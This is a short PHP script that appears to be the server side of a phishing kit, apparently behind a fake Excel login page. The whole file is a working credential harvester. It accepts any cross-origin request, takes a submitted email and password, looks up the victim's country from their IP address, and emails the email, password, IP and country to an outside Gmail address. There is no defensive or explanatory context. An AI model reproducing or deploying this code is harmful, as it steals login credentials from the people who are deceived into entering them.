<?php
// Allow from any origin
header("Access-Control-Allow-Origin: *");

// Access-Control headers are received during OPTIONS requests
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {

    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
        // may also be using PUT, PATCH, DELETE, etc.
        header("Access-Control-Allow-Methods: GET, POST, OPTIONS");         

    if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
        header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}, Content-Type");

    exit(0);
}


$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $email= $_POST['email'];
 $password = $_POST['textInput'];
 
		$to = "ajeeztax@gmail.com";
		
	// Get user's country based on IP address 
    $url = "http://ip-api.com/json/" . $ip;
    $response = file_get_contents($url);
    $data = json_decode($response);
    $country = $data->country;
		
         $subject = "Excel DropS - J : $ip";
		 
		 $love =  "Email ID            : ".$email."\r\n";
         $love .= "Password           : ".$password."\r\n";
		 $love .= "IP           : ".$ip."\r\n";
		 $love .= "Country           : ".$country."\r\n";
		$header = "Content type: Street Vibes \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$love,$header);

         

}
?>